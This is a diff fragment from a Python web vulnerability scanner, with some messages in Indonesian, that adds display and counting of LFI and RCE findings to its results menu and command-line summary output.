-        print_success(f"Total: {Fore.RED}{len(all_vulnerabilities)}{Style.RESET_ALL} SQLi, {Fore.RED}{len(all_blind_sqli_vulnerabilities)}{Style.RESET_ALL} Blind SQLi, {Fore.MAGENTA}{len(all_xss_vulnerabilities)}{Style.RESET_ALL} XSS, {Fore.YELLOW}{len(all_dom_xss_vulnerabilities)}{Style.RESET_ALL} DOM\n")
+        print_success(f"Total: {Fore.RED}{len(all_vulnerabilities)}{Style.RESET_ALL} SQLi, {Fore.RED}{len(all_blind_sqli_vulnerabilities)}{Style.RESET_ALL} Blind, {Fore.MAGENTA}{len(all_xss_vulnerabilities)}{Style.RESET_ALL} XSS, {Fore.YELLOW}{len(all_dom_xss_vulnerabilities)}{Style.RESET_ALL} DOM, {Fore.GREEN}{len(all_lfi_vulnerabilities)}{Style.RESET_ALL} LFI, {Fore.RED}{len(all_rce_vulnerabilities)}{Style.RESET_ALL} RCE\n")
         
         if all_vulnerabilities:
             print(f"\n    {Fore.RED}═══ SQL INJECTION VULNERABILITIES ═══{Style.RESET_ALL}")
@@ -1490,6 +2024,29 @@ def menu_view_results():
     {Fore.WHITE}URL:{Style.RESET_ALL} {vuln['url'][:70]}{'...' if len(vuln['url']) > 70 else ''}
     {Fore.WHITE}Source:{Style.RESET_ALL} {vuln['source']}
     {Fore.WHITE}Sink:{Style.RESET_ALL} {vuln['sink']}""")
+        
+        if all_lfi_vulnerabilities:
+            print(f"\n    {Fore.GREEN}═══ LFI (LOCAL FILE INCLUSION) VULNERABILITIES ═══{Style.RESET_ALL}")
+            for i, vuln in enumerate(all_lfi_vulnerabilities, 1):
+                payload_display = vuln['payload'][:50] if len(vuln['payload']) > 50 else vuln['payload']
+                print(f"""
+    {Fore.GREEN}[LFI-{i}]{Style.RESET_ALL} {Fore.CYAN}{'─'*55}{Style.RESET_ALL}
+    {Fore.YELLOW}URL:{Style.RESET_ALL} {vuln['url'][:70]}{'...' if len(vuln['url']) > 70 else ''}
+    {Fore.YELLOW}Parameter:{Style.RESET_ALL} {vuln['parameter']}
+    {Fore.YELLOW}File Type:{Style.RESET_ALL} {vuln['file_type']}
+    {Fore.YELLOW}Payload:{Style.RESET_ALL} {payload_display}""")
+        
+        if all_rce_vulnerabilities:
+            print(f"\n    {Fore.RED}{Back.WHITE}═══ RCE (REMOTE CODE EXECUTION) VULNERABILITIES ═══{Style.RESET_ALL}")
+            for i, vuln in enumerate(all_rce_vulnerabilities, 1):
+                payload_display = vuln['payload'][:50] if len(vuln['payload']) > 50 else vuln['payload']
+                evidence_display = vuln.get('evidence', 'N/A')[:50]
+                print(f"""
+    {Fore.RED}{Back.WHITE}[RCE-{i}]{Style.RESET_ALL} {Fore.RED}{'─'*55}{Style.RESET_ALL}
+    {Fore.YELLOW}URL:{Style.RESET_ALL} {vuln['url'][:70]}{'...' if len(vuln['url']) > 70 else ''}
+    {Fore.YELLOW}Parameter:{Style.RESET_ALL} {vuln['parameter']}
+    {Fore.YELLOW}Payload:{Style.RESET_ALL} {payload_display}
+    {Fore.YELLOW}Evidence:{Style.RESET_ALL} {evidence_display}""")
         
         print(f"\n    {Fore.CYAN}{'─'*60}{Style.RESET_ALL}")
     
@@ -2049,21 +2606,25 @@ def run_cli_mode(args):
     print()
     
     if len(urls) == 1:
-        sql_vulns, blind_vulns, xss_vulns, dom_vulns = scan_url(urls[0], settings['timeout'])
+        sql_vulns, blind_vulns, xss_vulns, dom_vulns, lfi_vulns, rce_vulns = scan_url(urls[0], settings['timeout'])
         results = {
             'sql_vulns': len(sql_vulns),
             'blind_vulns': len(blind_vulns),
             'xss_vulns': len(xss_vulns),
-            'dom_vulns': len(dom_vulns)
+            'dom_vulns': len(dom_vulns),
+            'lfi_vulns': len(lfi_vulns),
+            'rce_vulns': len(rce_vulns)
         }
     else:
         results = multi_threaded_scan(urls, settings['timeout'], settings['threads'])
     
     print_divider()
-    blind_vulns = results.get('blind_vulns', len(all_blind_sqli_vulnerabilities))
-    total_vulns = results['sql_vulns'] + blind_vulns + results['xss_vulns'] + results['dom_vulns']
+    blind_vulns_count = results.get('blind_vulns', len(all_blind_sqli_vulnerabilities))
+    lfi_vulns_count = results.get('lfi_vulns', len(all_lfi_vulnerabilities))
+    rce_vulns_count = results.get('rce_vulns', len(all_rce_vulnerabilities))
+    total_vulns = results['sql_vulns'] + blind_vulns_count + results['xss_vulns'] + results['dom_vulns'] + lfi_vulns_count + rce_vulns_count
     print_success(f"Scan selesai! Total: {Fore.RED}{total_vulns}{Style.RESET_ALL} vulnerability ditemukan")
-    print_info(f"SQLi: {results['sql_vulns']}, Blind: {blind_vulns}, XSS: {results['xss_vulns']}, DOM: {results['dom_vulns']}")
+    print_info(f"SQLi: {results['sql_vulns']}, Blind: {blind_vulns_count}, XSS: {results['xss_vulns']}, DOM: {results['dom_vulns']}, LFI: {lfi_vulns_count}, RCE: {rce_vulns_count}")
     
     if args.output:
         if args.output.endswith('.json'):
